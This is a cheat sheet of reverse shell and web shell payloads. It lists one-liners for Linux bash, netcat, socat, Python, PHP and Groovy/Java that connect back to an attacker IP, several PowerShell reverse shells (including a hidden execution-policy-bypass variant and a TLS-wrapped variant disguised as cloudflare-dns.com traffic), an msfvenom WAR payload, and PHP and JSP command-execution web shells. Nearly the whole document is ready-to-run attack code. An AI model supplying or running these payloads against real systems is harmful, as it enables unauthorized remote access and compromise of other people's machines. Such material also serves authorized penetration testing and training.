# Reverse and Web Shells Cheat Sheet

## Reverse Shells

### Linux

````
$ sh -i >& /dev/tcp/<IP-Attacker>/<Port> 0>&1
$ /bin/bash -i >& /dev/tcp/<IP-Attacker>/<Port> 0>&1
$ 0<&196;exec 196<>/dev/tcp/<IP-Attacker>/<Port>; sh <&196 >&196 2>&196
$ exec 5<>/dev/tcp/<IP-Attacker>/<Port>;cat <&5 | while read line; do $line 2>&5 >&5; done
$ sh -i >& /dev/udp/<IP-Attacker>/<Port> 0>&1
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP-Attacker> <Port> >/tmp/f
$ nc <IP-Attacker> <Port> -e sh
$ nc <IP-Attacker> <Port> -e /bin/bash
$ busybox nc <IP-Attacker> <Port> -e sh
$ ncat <IP-Attacker> <Port> -e sh
````

### Windows

````
$LHOST = "<IP-Attacker>"; $LPORT = <Port>; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
--------------------------------------------------------------------------------------------
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP-Attacker>',<Port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
--------------------------------------------------------------------------------------------
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('<IP-Attacker>', <Port>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
--------------------------------------------------------------------------------------------
$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('<IP-Attacker>', <Port>);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
--------------------------------------------------------------------------------------------
> nc.exe <IP-Attacker> <Port> -e cmd.exe
> powershell -e base64_payload
````

**Other Languages**

For windows just change "sh" by "cmd.exe or powershell.exe"

**Socat**
````
socat TCP:<IP-Attacker>:<Port> EXEC:sh
````

**Python**
````
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP-Attacker>",<Port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
--------------------------------------------------------------------------------------------
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP-Attacker>",<Port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
````

**PHP**
````
php -r '$sock=fsockopen("<IP-Attacker>",<Port>);exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<IP-Attacker>",<Port>);shell_exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<IP-Attacker>",<Port>);system("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<IP-Attacker>",<Port>);passthru("sh <&3 >&3 2>&3");'
````

**War**
````
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP-Attacker> LPORT=<Port> -f war > backup.war
````

**Groovy**
````
- Linux -

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP-Attacker>/<Port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
--------------------------------------------------------------------------------------------
- Windows -

String host="<IP-Attacker>";
int port=<Port>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
````



Visit this website: https://www.revshells.com/

## Web Shells

**PHP**
````
<?php system($_GET['cmd']); ?>
````

**JSP**
````
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
````


